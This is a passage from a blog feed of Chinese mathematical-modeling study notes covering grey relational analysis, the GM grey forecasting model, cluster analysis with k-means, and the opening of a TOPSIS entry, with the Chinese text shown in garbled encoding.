title="ç°è‰²å…³è”åº¦çš„æ•°å­¦æ¨¡å‹"></a>ç°è‰²å…³è”åº¦çš„æ•°å­¦æ¨¡å‹</h3><p>é¦–å…ˆä¹Ÿæ˜¯æœ€é‡è¦çš„ï¼Œæˆ‘ä»¬éœ€è¦ç¡®å®š<strong>å‚è€ƒæ•°åˆ—</strong>ã€‚æˆ‘ä»¬å‡è®¾å‚è€ƒæ•°åˆ—ä¸º $X_{0}$ ï¼Œæœ‰ï¼š</p><p>$$<br>X_{0}&#x3D;ï¼ˆX_{0}(k) | k&#x3D;1,2,\ldots,nï¼‰&#x3D;(X_{0}(1),X_{0}(2),\ldots,X_{0}(n))<br>$$</p><p>å…¶ä¸­ $k$ è¡¨ç¤ºæ—¶åˆ»</p><p>å‡è®¾æœ‰mä¸ª<strong>æ¯”è¾ƒæ•°åˆ—</strong></p><p>$$<br>X_{i}&#x3D;ï¼ˆX_{i}(k)|k&#x3D;1,2,\ldots,n ï¼‰&#x3D;(X_{i}(1),X_{i}(2),\ldots,X_{i}(n))\\<br>(i&#x3D;1,2,\ldots,n)<br>$$</p><p>åˆ™ç§°</p><p><img src="/Pictures/MCM/GRA/plot01.png" alt="img"></p><p>ä¸ºç°è‰²å…³è”ç³»æ•°ï¼Œå…¶ä¸­ $\rho$ ç§°ä¸ºåˆ†è¾¨ç³»æ•°ï¼Œä¸€èˆ¬å– $\rho &#x3D; 0.5$ ã€‚</p><p>ç”±ä¸Šå¼ç»™å‡ºçš„å®šä¹‰åœ¨å„ä¸ªæ—¶åˆ»éƒ½æœ‰ä¸€ä¸ªå…³è”ç³»æ•°ï¼Œä¿¡æ¯è¿‡äºåˆ†æ•£ä¸æ˜“æ¯”è¾ƒï¼Œå› æ­¤æˆ‘ä»¬ç»™å‡º</p><p>$$ r_{i}&#x3D;\frac{1}{n} \sum_{k&#x3D;1}^{n} \zeta_{i}(k) $$</p><p>ä¸ºæ¯”è¾ƒæ•°åˆ—å¯¹å‚è€ƒæ•°åˆ—çš„<strong>å…³è”åº¦</strong>ã€‚</p><p>ç”±äºå…¬å¼ç ”ç©¶çš„æ˜¯å…³è”ç³»æ•°çš„ç›¸å¯¹å¤§å°ï¼Œæ— æ³•åˆ¤æ–­æ˜¯æ­£ç›¸å…³è¿˜æ˜¯è´Ÿç›¸å…³ï¼Œæˆ‘ä»¬è®°</p><p>$$<br>\sigma_{i}&#x3D;\sum_{k&#x3D;1}^{n}kX_{i}(k)-\sum_{k&#x3D;1}^{n}X_{i}(k)\sum_{k&#x3D;1}^{n}\frac{k}{n}<br>$$</p><p>$$<br>\sigma_{n}&#x3D;\sum_{k&#x3D;1}^{n}k^{2}-\frac{2(\sum_{k&#x3D;1}^{n}k)}{n}<br>$$</p><p>$$sign(\frac{\sigma_{i}}{\sigma_{n}})&#x3D;sign(\frac{\sigma_{j}}{\sigma_{n}})$$ </p><p>ç§°æ•°åˆ—iä¸jä¸ºæ­£ç›¸å…³ï¼Œåä¹‹è‹¥ä¸åŒå·åˆ™ä¸ºè´Ÿç›¸å…³ã€‚</p><h2 id="ç°è‰²ç”Ÿæˆæ•°åˆ—"><a href="#ç°è‰²ç”Ÿæˆæ•°åˆ—" class="headerlink" title="ç°è‰²ç”Ÿæˆæ•°åˆ—"></a>ç°è‰²ç”Ÿæˆæ•°åˆ—</h2><p>ç°è‰²åºåˆ—å¸¸è§çš„æ•°æ®ç”Ÿæˆæ–¹æ³•æœ‰ï¼šç´¯åŠ ç”Ÿæˆã€ç´¯å‡ç”Ÿæˆå’ŒåŠ æƒç´¯åŠ ã€‚</p><h3 id="ç´¯åŠ ç”Ÿæˆ"><a href="#ç´¯åŠ ç”Ÿæˆ" class="headerlink" title="ç´¯åŠ ç”Ÿæˆ"></a>ç´¯åŠ ç”Ÿæˆ</h3><p>æŠŠæ•°åˆ—å„é¡¹ï¼ˆæ—¶åˆ»ï¼‰æ•°æ®ä¾æ¬¡ç´¯åŠ çš„è¿‡ç¨‹ç§°ä¸ºç´¯åŠ ç”Ÿæˆè¿‡ç¨‹ï¼Œç”±ç´¯åŠ ç”Ÿæˆè¿‡ç¨‹æ‰€å¾—çš„æ•°åˆ—ç§°ä¸ºç´¯åŠ ç”Ÿæˆæ•°åˆ—ã€‚</p><p>è‹¥åŸå§‹æ•°åˆ—ä¸º $x^{0}&#x3D;(x^{0}(1),x^{0}(2),\ldots,x^{0}(n))$</p><p>ä»¤ $x^{1}(k)&#x3D;\sum_{i&#x3D;1}^{k}x^{0}(i)$ ,å¾—åˆ°æ–°æ•°åˆ—,ç§°ä¸º1æ¬¡ç´¯åŠ ç”Ÿæˆæ•°åˆ—ã€‚</p><p>ä¾‹å¦‚ï¼Œæ•°åˆ— $(1,2,3,4)$ ç»è¿‡ç´¯åŠ å¤„ç†å¾—åˆ° $(1,3,6,10)$</p><p>å¤šæ¬¡ç´¯åŠ å¤„ç†å³å¯å¾—åˆ°iæ¬¡ç´¯åŠ ç”Ÿæˆæ•°åˆ—</p><h3 id="ç´¯å‡ç”Ÿæˆ"><a href="#ç´¯å‡ç”Ÿæˆ" class="headerlink" title="ç´¯å‡ç”Ÿæˆ"></a>ç´¯å‡ç”Ÿæˆ</h3><p>ä¸ºç´¯åŠ è¿‡ç¨‹çš„é€†è¿‡ç¨‹</p><p>ç”±ä¸Šè¿°çš„æ•°åˆ— $x^{1}$ ç´¯å‡å¾—åˆ°çš„æ•°åˆ—å°±æ˜¯ $x^{0}$</p><p>åœ¨å®é™…è¿ç”¨ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥iåœ¨æ•°åˆ— $x^{1}$ çš„åŸºç¡€ä¸Šå¾—åˆ°é¢„æµ‹æ•°åˆ— $\hat x^{1}$ ï¼Œç´¯å‡å¾—åˆ°é¢„æµ‹æ•°åˆ— $\hat x^{0}$ ã€‚</p><p>ä¸éš¾çœ‹å‡ºï¼Œç´¯å‡ç”Ÿæˆå…·æœ‰æ±‚å¯¼æ€§è´¨ã€‚</p><h3 id="åŠ æƒé‚»å€¼ç”Ÿæˆ"><a href="#åŠ æƒé‚»å€¼ç”Ÿæˆ" class="headerlink" title="åŠ æƒé‚»å€¼ç”Ÿæˆ"></a>åŠ æƒé‚»å€¼ç”Ÿæˆ</h3><p>åœ¨åŸå§‹æ•°åˆ—ä¸­ï¼Œç›¸é‚»çš„ä¸¤ä¸ªæ•°æ®ç§°ä¸ºå‰é‚»å€¼å’Œåé‚»å€¼ã€‚å¯¹äºå¸¸æ•° $\alpha$ ï¼Œä»¤ï¼š</p><p>$$z^{0}(k)&#x3D;\alpha x^{0}(k)+(1-\alpha)x^{0}(k-1)$$</p><p>å¾—åˆ°çš„æ•°åˆ— $z^{0}$ ç§°ä¸ºæ•°åˆ— $x^{0}$ åœ¨æƒ $\alpha$ ä¸‹çš„é‚»å€¼ç”Ÿæˆæ•°ï¼Œ $\alpha$ ä¸ºç”Ÿæˆç³»æ•°ã€‚</p><p>å½“ $\alpha&#x3D;0.5$ æ—¶ï¼Œä¹Ÿç§°å‡å€¼ç”Ÿæˆæ•°ã€‚</p><p>åº”ç”¨ï¼šä¾¿äºå°†æ— è§„å¾‹çš„æ•°æ®å¤„ç†ä¸ºæœ‰ä¸€å®šè§„å¾‹çš„æ•°æ®ã€‚</p><p><img src="/Pictures/MCM/GRA/plot02.png" alt="img"></p><p><img src="/Pictures/MCM/GRA/plot03.png" alt="img"></p><h2 id="ç°è‰²æ¨¡å‹GM"><a href="#ç°è‰²æ¨¡å‹GM" class="headerlink" title="ç°è‰²æ¨¡å‹GM"></a>ç°è‰²æ¨¡å‹GM</h2><p>ç°è‰²æ¨¡å‹æ˜¯åˆ©ç”¨ç¦»æ•£éšæœºæ•°ç»è¿‡ç”Ÿæˆå˜ä¸ºéšæœºæ€§è¢«æ˜¾è‘—å‰Šå¼±è€Œä¸”æœ‰è§„å¾‹çš„ç”Ÿæˆæ•°å»ºç«‹èµ·çš„å¾®åˆ†æ–¹ç¨‹å½¢å¼çš„æ¨¡å‹ï¼Œè¿™æ ·ä¾¿äºå¯¹å…¶å˜åŒ–è¿‡ç¨‹è¿›è¡Œç ”ç©¶å’Œæè¿°ã€‚</p><p>è®¾åŸå§‹æ•°åˆ—ä¸º $x^{0}&#x3D;(x^{0}(1),x^{0}(2),\ldots,x^{0}(n))$</p><p>ä¸€æ¬¡ç´¯åŠ æ•°åˆ—ä¸º $x^{1}&#x3D;(x^{1}(1),x^{1}(2),\ldots,x^{1}(n))$</p><p>å®šä¹‰ $x^{1}$ çš„<strong>ç°å¯¼æ•°</strong>ä¸ºï¼š</p><p>$$d(k)&#x3D;x^{0}(k)&#x3D;x^{1}(k)-x^{1}(k-1)$$</p><p>ä»¤ $z^{1}$ ä¸ºæ•°åˆ— $x^{1}$ çš„é‚»å€¼ç”Ÿæˆæ•°åˆ—ï¼Œå³</p><p>$$z^{0}(k)&#x3D;\alpha x^{0}(k)+(1-\alpha)x^{0}(k-1)$$</p><p>äºæ˜¯å®šä¹‰GMçš„ç°å¾®åˆ†æ–¹ç¨‹æ¨¡å‹ä¸º</p><p>$$d(k)+az^{1}(k)&#x3D;x^{0}(k)&#x3D;az^{1}(k)&#x3D;b$$</p><p>æˆ‘ä»¬ç§°aä¸ºå‘å±•ç³»æ•°ï¼Œbä¸ºç°ä½œç”¨é‡ã€‚</p><p>å°†kä»£å…¥å¯å¾—ï¼š</p><p>$$\begin{cases}<br>x^{0}(2)&#x3D;az^{1}(2)&#x3D;b \\<br>x^{0}(3)&#x3D;az^{1}(3)&#x3D;b \\<br>\ldots \\<br>x^{0}(n)&#x3D;az^{1}(n)&#x3D;b<br>\end{cases}$$</p><p><img src="/Pictures/MCM/GRA/plot04.png" alt="img"></p><p>åˆ™è¯¥æ¨¡å‹è¡¨ç¤ºä¸º $Y&#x3D;Bu$</p><p>ç”¨æœ€å°äºŒä¹˜æ³•ä¼°è®¡ï¼š</p><p><img src="/Pictures/MCM/GRA/plot05.png" alt="img"></p><p><strong>è¿™æ ·æˆ‘ä»¬å¯ä»¥å¾—åˆ°aã€bçš„å€¼ã€‚</strong></p><p>ä¹‹åï¼Œæˆ‘ä»¬å»ºç«‹GMæ¨¡å‹ï¼Œå¾—å‡ºå¯¹åº”çš„ç™½åŒ–æ¨¡å‹å¹¶æ±‚è§£ã€‚</p><p>ç™½åŒ–æ¨¡å‹ä¸ºï¼š</p><p>$$<br>\frac{dx^{1}(t)}{dt}+ax^{1}(t)&#x3D;b<br>$$</p><p>é€šè§£ä¸ºï¼š</p><p>$$<br>x^{1}(t)&#x3D;(x^{0}(1)-\frac{b}{a})e^{-a(t-1)}+\frac{b}{a}<br>$$</p><p>å°†tæ›¿æ¢ä¸ºkï¼Œå³å¾—åˆ°é¢„æµ‹å€¼ã€‚</p><h2 id="æ•°æ®çš„å¤„ç†"><a href="#æ•°æ®çš„å¤„ç†" class="headerlink" title="æ•°æ®çš„å¤„ç†"></a>æ•°æ®çš„å¤„ç†</h2><p>åœ¨å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦å¯¹åŸå§‹æ•°æ®è¿›è¡Œå¤„ç†ã€‚</p><p>è®¾åŸå§‹æ•°åˆ—ä¸º $x^{0}&#x3D;(x^{0}(1),x^{0}(2),\ldots,x^{0}(n))$</p><p>å®šä¹‰<strong>æ•°åˆ—çš„çº§æ¯”</strong>ï¼š</p><p>$$<br>\lambda(k)&#x3D;\frac{x^{0}(k-1)}{x^{0}(k)},k&#x3D;2,3,\ldots,n<br>$$</p><p>å¦‚æœæ‰€æœ‰çš„çº§æ¯”å‡è½åœ¨å¯å®¹è¦†ç›–åŒºé—´ $X&#x3D;(e^{\frac{-2}{n+1}},e^{\frac{2}{n+1}})$ å†…ï¼Œåˆ™æ•°æ®å¯ä»¥å»ºç«‹GMæ¨¡å‹ã€‚</p><p>å¦åˆ™éœ€è¦å¯¹æ•°æ®è¿›è¡Œå˜æ¢å¤„ç†ã€‚</p><p>å¹³ç§»å˜æ¢ï¼šå–å¸¸æ•°cï¼Œä½¿æ•°æ®åˆ—</p><p>$$y^{0}(k)&#x3D;x^{0}(k)+C$$</p><p>è®©æ•°æ®å‡è½åœ¨åŒºé—´å†…ã€‚</p><h2 id="ç»“æœçš„æ£€éªŒ"><a href="#ç»“æœçš„æ£€éªŒ" class="headerlink" title="ç»“æœçš„æ£€éªŒ"></a>ç»“æœçš„æ£€éªŒ</h2><ol><li>æ®‹å·®æ£€éªŒ<br>å®šä¹‰ç›¸å¯¹æ®‹å·®ï¼š<br>$$<br>\varepsilon (k)&#x3D;\frac{x^{0}(k)-\hat x^{0}(k)}{x^{0}(k)}<br>$$</li></ol><p>æ ¹æ®å®é™…æƒ…å†µç•Œå®šæ®‹å·®çš„èŒƒå›´ï¼Œä¸€èˆ¬è¦æ±‚ $\varepsilon(k) &lt;0.2$</p><ol start="2"><li>çº§æ¯”åå·®å€¼æ£€éªŒï¼š<br>$$<br>\rho(k)&#x3D;1-\frac{1-0.5a}{1+0.5a} \lambda (k)<br>$$</li></ol><p>æ ¹æ®å®é™…æƒ…å†µç•Œå®šæ®‹å·®çš„èŒƒå›´ï¼Œä¸€èˆ¬è¦æ±‚ $\rho(k) &lt;0.2$</p>]]></content>
    
    
    <categories>
      
      <category>MCM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MCM</tag>
      
      <tag>GRA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CA</title>
    <link href="/2024/01/28/CA/"/>
    <url>/2024/01/28/CA/</url>
    
    <content type="html"><![CDATA[<h1 id="èšç±»åˆ†æï¼ˆCAï¼‰"><a href="#èšç±»åˆ†æï¼ˆCAï¼‰" class="headerlink" title="èšç±»åˆ†æï¼ˆCAï¼‰"></a>èšç±»åˆ†æï¼ˆCAï¼‰</h1><h2 id="èšç±»ï¼ˆClusteringï¼‰"><a href="#èšç±»ï¼ˆClusteringï¼‰" class="headerlink" title="èšç±»ï¼ˆClusteringï¼‰"></a>èšç±»ï¼ˆClusteringï¼‰</h2><p>èšç±»æ˜¯å°†ä¸€ä¸ªæ•°æ®é›†åˆ’åˆ†ä¸ºè‹¥å¹²ç»„ï¼ˆclassï¼‰æˆ–ç±»ï¼ˆclusterï¼‰çš„è¿‡ç¨‹ï¼Œä½¿å¾—åŒä¸€ç»„å†…çš„æ•°æ®å¯¹è±¡å…·æœ‰è¾ƒé«˜çš„ç›¸ä¼¼åº¦ï¼Œè€Œä¸åŒç»„çš„æ•°æ®å¯¹è±¡æ˜¯ä¸ç›¸ä¼¼çš„ã€‚</p><p>ç›¸ä¼¼å’Œä¸ç›¸ä¼¼æ˜¯åŸºäºæ•°æ®æè¿°å±æ€§çš„å–å€¼æ¥å†³å®šçš„ï¼Œé€šå¸¸åˆ©ç”¨å„æ•°æ®å¯¹è±¡ä¹‹é—´çš„è·ç¦»æ¥è¡¨ç¤ºã€‚</p><p>èšç±»åˆ†æé€‚ç”¨äºæ¢è®¨æ ·æœ¬ä¹‹é—´çš„ç›¸äº’å…³è”å…³ç³»ä»è€Œå¯¹ä¸€ä¸ªæ ·æœ¬ç»“æ„åšä¸€ä¸ªåˆæ­¥çš„è¯„ä»·ã€‚</p><blockquote><p>èšç±»å’Œåˆ†ç±»çš„åŒºåˆ«ï¼šèšç±»æ˜¯ä¸€ç§æ— ç›‘ç£çš„å­¦ä¹ æ–¹æ³•ï¼Œä¸ä¾èµ–äºäº‹å…ˆç¡®å®šçš„æ•°æ®ç±»åˆ«ä»¥åŠæ ‡æœ‰æ•°æ®ç±»åˆ«çš„å­¦ä¹ è®­ç»ƒæ ·æœ¬é›†åˆã€‚</p></blockquote><h2 id="èšç±»åˆ†æçš„åˆ†ç±»"><a href="#èšç±»åˆ†æçš„åˆ†ç±»" class="headerlink" title="èšç±»åˆ†æçš„åˆ†ç±»"></a>èšç±»åˆ†æçš„åˆ†ç±»</h2><p>èšç±»åˆ†æç”±ä¸¤ç§ç»„æˆï¼š</p><ul><li>å¯¹æ ·å“çš„åˆ†ç±»ï¼Œç§°ä¸ºQå‹</li><li>å¯¹å˜é‡ï¼ˆæŒ‡æ ‡ï¼‰çš„åˆ†ç±»ï¼Œç§°ä¸ºRå‹</li></ul><p>Rå‹èšç±»åˆ†æçš„ä¸»è¦ä½œç”¨ï¼š</p><ol><li>äº†è§£å„ä¸ªå˜é‡ä¹‹é—´çš„äº²ç–ç¨‹åº¦ï¼Œè¿›è¡Œç»¼åˆé™ç»´å¤„ç†</li><li>æ ¹æ®å˜é‡çš„åˆ†ç±»ç»“æœä»¥åŠå®ƒä»¬ä¹‹é—´çš„å…³ç³»ï¼Œå¯ä»¥é€‰æ‹©ä¸»è¦å˜é‡è¿›è¡ŒQå‹èšç±»åˆ†ææˆ–å›å½’åˆ†æ</li></ol><p>Qå‹èšç±»åˆ†æçš„ä¸»è¦ä½œç”¨ï¼š</p><ol><li>å¯ä»¥ç»¼åˆåˆ©ç”¨å¤šä¸ªå˜é‡çš„ä¿¡æ¯å¯¹æ ·æœ¬è¿›è¡Œåˆ†æã€‚</li><li>åˆ†ç±»ç»“æœç›´è§‚ï¼Œèšç±»è°±ç³»å›¾æ¸…æ¥šåœ°è¡¨ç°æ•°å€¼åˆ†ç±»ç»“æœã€‚</li><li>èšç±»åˆ†ææ‰€å¾—åˆ°çš„ç»“æœæ›´ä¸ºç»†è‡´å…¨é¢ã€‚</li></ol><p>Qå‹èšç±»åˆ†æä¸€èˆ¬æ˜¯æˆ‘ä»¬ç ”ç©¶çš„é‡ç‚¹ï¼ŒQå‹èšç±»çš„ç»Ÿè®¡é‡ä¸€èˆ¬æ˜¯è·ç¦»ã€‚</p><h2 id="æ ·å“é—´çš„ç›¸ä¼¼åº¦é‡â€”â€”è·ç¦»"><a href="#æ ·å“é—´çš„ç›¸ä¼¼åº¦é‡â€”â€”è·ç¦»" class="headerlink" title="æ ·å“é—´çš„ç›¸ä¼¼åº¦é‡â€”â€”è·ç¦»"></a>æ ·å“é—´çš„ç›¸ä¼¼åº¦é‡â€”â€”è·ç¦»</h2><p>è®¾æœ‰nä¸ªæ ·æœ¬çš„på…ƒè§‚æµ‹æ•°æ®ï¼š</p><p>$$x_{i}&#x3D;(x_{i1},x_{i2},\ldots,x_{ip})^{T} , i&#x3D;1,2,\ldots,n$$</p><p>è¿™æ—¶ï¼Œæ¯ä¸€ä¸ªæ ·æœ¬å¯ä»¥çœ‹ä½œpå…ƒç©ºé—´çš„ä¸€ä¸ªç‚¹ï¼Œæ¯ä¸¤ä¸ªç‚¹ä¹‹é—´çš„è·ç¦»è®°ä¸º $d(x_{i},x_{j})$ ã€‚</p><p>$$\begin{cases}<br>d(x_{i},x_{j})\ge 0,ä¸” d(x_{i},x_{j})&#x3D;0 å½“ä¸”ä»…å½“x_{i}&#x3D;x_{j}\\<br>d(x_{i},x_{j})&#x3D;d(x_{j},x_{i})<br>d(x_{i},x{j})\le d(x_{i},x_{k})+d(x_{k},x_{j})<br>\end{cases}$$</p><ol><li>æ¬§å¼è·ç¦»</li></ol><p>$$d(x_{i},x_{j})&#x3D;\sqrt{\sum_{k&#x3D;1}^{p}(x_{ik}-x_{jk})^{2}}$$</p><p>è®°ä¸º $pdist(x)$</p><ol start="2"><li>æ˜å¼è·ç¦»</li></ol><p>$$d(x_{i},x_{j})&#x3D;[{\sum_{k&#x3D;1}^{p}(x_{ik}-x_{jk})^{m}}]^{\frac{1}{m}}$$</p><ol start="3"><li>åˆ‡å¼è·ç¦»</li></ol><p>$$d(x_{i},x_{j})&#x3D;max\ \left| x_{ik}-x_{jk} \right | $$</p><h2 id="å˜é‡ä¹‹é—´çš„ç›¸ä¼¼åº¦é‡â€”â€”ç›¸ä¼¼ç³»æ•°"><a href="#å˜é‡ä¹‹é—´çš„ç›¸ä¼¼åº¦é‡â€”â€”ç›¸ä¼¼ç³»æ•°" class="headerlink" title="å˜é‡ä¹‹é—´çš„ç›¸ä¼¼åº¦é‡â€”â€”ç›¸ä¼¼ç³»æ•°"></a>å˜é‡ä¹‹é—´çš„ç›¸ä¼¼åº¦é‡â€”â€”ç›¸ä¼¼ç³»æ•°</h2><p>å½“å¯¹pä¸ªæŒ‡æ ‡å˜é‡è¿›è¡Œèšç±»æ—¶ï¼Œç”¨ç›¸ä¼¼ç³»æ•°æ¥è¡¡é‡å˜é‡ä¹‹é—´çš„ç›¸ä¼¼ç¨‹åº¦ï¼ˆå…³è”åº¦ï¼‰ã€‚</p><p>$$å®šä¹‰ç›¸ä¼¼ç³»æ•°ä¸º C_{\alpha \beta }$$</p><p>æ»¡è¶³ï¼š</p><p>$$\begin{cases}<br>\left |C_{\alpha \beta } \right | \le 1 \\<br>C_{\alpha \alpha }&#x3D;1 \\<br>C_{\alpha \beta }&#x3D;\pm 1 å½“ä¸”ä»…å½“ \alpha&#x3D;k \beta,k\ne 0 \\<br>C_{\alpha \beta }&#x3D;C_{\beta \alpha}<br>\end{cases}$$</p><p>ç›¸ä¼¼ç³»æ•°ä¸­æœ€å¸¸ç”¨çš„æ˜¯ç›¸å…³ç³»æ•°ä¸å¤¹è§’ä½™å¼¦ã€‚</p><ol><li>å¤¹è§’ä½™å¼¦<br>ä¸¤å˜é‡çš„å¤¹è§’ä½™å¼¦çš„å®šä¹‰ä¸ºï¼š</li></ol><p>$$C_{ij}&#x3D;cos\ \alpha_{ij}&#x3D; \frac{\sum_{t&#x3D;1}^{n}x_{ti}x_{tj}}{\sqrt{\sum_{t&#x3D;1}^{n}x_{ti}^{2}} \sqrt{\sum_{t&#x3D;1}^{n}x_{tj}^{2}}}$$</p><ol start="2"><li>ç›¸å…³ç³»æ•°<br>ä¸¤å˜é‡çš„ç›¸å…³ç³»æ•°ä¸ºï¼š</li></ol><p>$$C_{ij}&#x3D; \frac{\sum_{t&#x3D;1}^{n}(x_{ti}-\bar x_{i})(x_{tj}-\bar x_{j})}{\sqrt{\sum_{t&#x3D;1}^{n}(x_{ti}-\bar x_{i})^{2}} \sqrt{\sum_{t&#x3D;1}^{n}(x_{tj}-\bar x_{j})^{2}}}$$</p><h2 id="ç±»é—´è·ç¦»"><a href="#ç±»é—´è·ç¦»" class="headerlink" title="ç±»é—´è·ç¦»"></a>ç±»é—´è·ç¦»</h2><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥æ¥è®¡ç®—ä¸¤ä¸ªç±»åˆ«ä¹‹é—´çš„è·ç¦»ã€‚</p><p>è®¾ $d_{ij}$ è¡¨ç¤ºä¸¤ä¸ªæ ·å“ $x_{i},x_{j}$ ä¹‹é—´çš„è·ç¦»ï¼Œ $G_{p},G_{q}$ è¡¨ç¤ºä¸¤ä¸ªç±»åˆ«ï¼Œå„è‡ªå«æœ‰ $n_{p},n_{q}$ ä¸ªæ ·å“ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ç”¨ä¸¤ç±»ä¸­çš„æ ·æœ¬ä¹‹é—´çš„æœ€çŸ­ï¼ˆæœ€é•¿ï¼‰è·ç¦»ä½œä¸ºä¸¤ç±»ä¹‹é—´çš„è·ç¦»ã€‚</p><ul><li><p>é‡å¿ƒè·ç¦»ï¼šå¹³å‡ç‚¹ä¹‹é—´çš„è·ç¦»:<br>$$D_{pq}&#x3D;\sqrt{(\bar x_{p}-\bar x_{q})^{T}(\bar x_{p}-\bar x_{q})}$$</p></li><li><p>é‡å¿ƒï¼šæ¯ä¸ªç»´åº¦çš„åæ ‡å‡ä¸ºæ‰€æœ‰åæ ‡çš„ç®—æœ¯å¹³å‡æ•°</p></li><li><p>ç±»å¹³å‡è·ç¦»ï¼š<br>$$D_{pq}&#x3D;\frac{1}{n_{p}n_{q}} \sum_{i\in G_{p}} \sum_{j\in G_{q}} d_{ij} $$</p></li></ul><h2 id="è°±ç³»èšç±»æ³•çš„æ­¥éª¤"><a href="#è°±ç³»èšç±»æ³•çš„æ­¥éª¤" class="headerlink" title="è°±ç³»èšç±»æ³•çš„æ­¥éª¤"></a>è°±ç³»èšç±»æ³•çš„æ­¥éª¤</h2><ol><li>é€‰æ‹©æ ·æœ¬ç‚¹ä¹‹é—´è·ç¦»çš„å®šä¹‰ä»¥åŠç±»é—´è·ç¦»çš„å®šä¹‰</li><li>è®¡ç®—nä¸ªæ ·æœ¬ä¸¤ä¸¤ä¹‹é—´çš„è·ç¦»ï¼Œå¾—åˆ°è·ç¦»çŸ©é˜µ $D&#x3D;(d_{ij})_{n*n}$ ï¼ŒDä¸ºå®å¯¹ç§°çŸ©é˜µ</li><li>æ„é€ ä¸ªç±»ï¼Œæ¯ä¸ªç±»åªå«æœ‰ä¸€ä¸ªæ ·æœ¬</li><li>åˆå¹¶ç¬¦åˆç±»é—´è·ç¦»å®šä¹‰è¦æ±‚çš„ä¸¤ä¸ªç±»ä¸ºä¸€ä¸ªæ–°ç±»</li><li>é‡æ–°è®¡ç®—ç±»é—´è·ç¦»ï¼Œå¹¶é‡å¤ä¸Šè¿°æ­¥éª¤ç›´åˆ°ç±»æ•°ä¸º1</li><li>ç”»å‡ºèšç±»å›¾</li><li>å†³å®šç±»çš„ä¸ªæ•°å’Œç±»</li></ol><p>ä¸‹å›¾ä¸ºèšç±»è°±ç³»å›¾çš„å®ä¾‹ï¼š</p><p><img src="/Pictures/MCM/CA/plot01.png" alt="img"></p><p>ä¸Šå›¾ä¸­ï¼Œ3ï¼Œ4åœ¨2.20å¤„åˆ†ä¸ºäº†ä¸€ç±»G1ï¼ŒG1å’Œ5åœ¨2.21å¤„åˆ†ä¸ºäº†ä¸€ç±»G2ï¼Œ1ï¼Œ2åœ¨11å·¦å³åˆ†ä¸ºäº†ä¸€ç±»G3ï¼Œåˆ°æœ€å¤§å€¼æ—¶G2å’ŒG3å½’ä¸ºä¸€ç±»G0.</p><h2 id="kâ€”â€”å¹³å‡èšç±»ç®—æ³•"><a href="#kâ€”â€”å¹³å‡èšç±»ç®—æ³•" class="headerlink" title="kâ€”â€”å¹³å‡èšç±»ç®—æ³•"></a>kâ€”â€”å¹³å‡èšç±»ç®—æ³•</h2><h3 id="k-meansç®—æ³•"><a href="#k-meansç®—æ³•" class="headerlink" title="k-meansç®—æ³•"></a><em>k-means</em>ç®—æ³•</h3><ol><li>ä»nä¸ªæ•°æ®å¯¹è±¡ä¸­é€‰æ‹©kä¸ªå¯¹è±¡ä½œä¸ºåˆå§‹èšç±»ä¸­å¿ƒ</li><li>æ ¹æ®æ¯ä¸ªèšç±»å¯¹è±¡çš„å‡å€¼ï¼ˆä¸­å¿ƒå¯¹è±¡ï¼‰ï¼Œè®¡ç®—è·ç¦»å¹¶æ ¹æ®æœ€å°è·ç¦»é‡æ–°å¯¹ç›¸åº”å¯¹è±¡è¿›è¡Œåˆ’åˆ†</li><li>æ›´æ–°ä¸­å¿ƒå¯¹è±¡</li><li>å¾ªç¯ä¸Šè¿°æ­¥éª¤ä¸€ç›´åˆ°æ¯ä¸ªèšç±»ä¸å†å˜åŒ–</li></ol><p>ç®—æ³•ç‰¹ç‚¹ï¼š</p><ul><li>åªé€‚ç”¨äºå‡å€¼æœ‰æ„ä¹‰çš„åœºæ‰€</li><li>å¯¹ç¦»ç¾¤ç‚¹å’Œå™ªå£°æ•°æ®æ•æ„Ÿï¼Œæç«¯æ•ˆåº”ä¸¥é‡</li></ul><p><img src="/Pictures/MCM/CA/plot02.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>MCM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MCM</tag>
      
      <tag>CA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TOPSIS</title>
    <link href="/2024/01/28/TOPSIS/"/>
    <url>/2024/01/28/TOPSIS/</url>
    
    <content type="html"><![CDATA[<h1 id="TOPSISæ³•ç®€è¿°"><a href="#TOPSISæ³•ç®€è¿°" class="headerlink" title="TOPSISæ³•ç®€è¿°"></a>TOPSISæ³•ç®€è¿°</h1><p>TOPSISæ³•ï¼Œåˆç§°ç†æƒ³è§£æ³•ã€‚è¿™ç§æ–¹æ³•é€šè¿‡æ„é€ è¯„ä»·é—®é¢˜çš„æ­£ç†æƒ³è§£å’Œè´Ÿç†æƒ³è§£ï¼Œå³å„æŒ‡æ ‡çš„æœ€ä¼˜è§£å’Œæœ€åŠ£è§£ï¼Œé€šè¿‡è®¡ç®—æ¯ä¸ªæ–¹æ¡ˆåˆ°ç†æƒ³æ–¹æ¡ˆçš„ç›¸å¯¹è´´è¿›åº¦ï¼Œè¿œç¦»æœ€åŠ£è§£çš„ç¨‹åº¦æ¥è¿›è¡Œæ’åºã€‚</p><h2 id="æ–¹æ³•å’ŒåŸç†"><a href="#æ–¹æ³•å’ŒåŸç†" class="headerlink" title="æ–¹æ³•å’ŒåŸç†"></a>æ–¹æ³•å’ŒåŸç†</h2><p>è®¾å¤šå±æ€§å†³ç­–æ–¹æ¡ˆé›†ä¸º $D&#x3D;$ { $d_{i}|i&#x3D;1,2,\ldots,n$ } ï¼Œè¡¡é‡æ–¹æ¡ˆä¼˜åŠ£çš„å±æ€§å˜é‡ä¸º $x_{i}$ ï¼Œè¿™æ—¶æ–¹æ¡ˆé›†Dä¸­æ¯ä¸ªæ–¹æ¡ˆçš„nä¸ªå±æ€§å€¼æ„æˆçš„å‘é‡æ˜¯ $\left[ a_{i1},\ldots,a_{in} \right]$ ï¼Œå®ƒä½œä¸ºç©ºé—´ä¸­çš„ä¸€ä¸ªç‚¹ï¼Œèƒ½å”¯ä¸€åœ°è¡¨å¾æ–¹æ¡ˆ $d_{i}$ ã€‚</p><p>æ­£ç†æƒ³è§£ $C^{*}$ 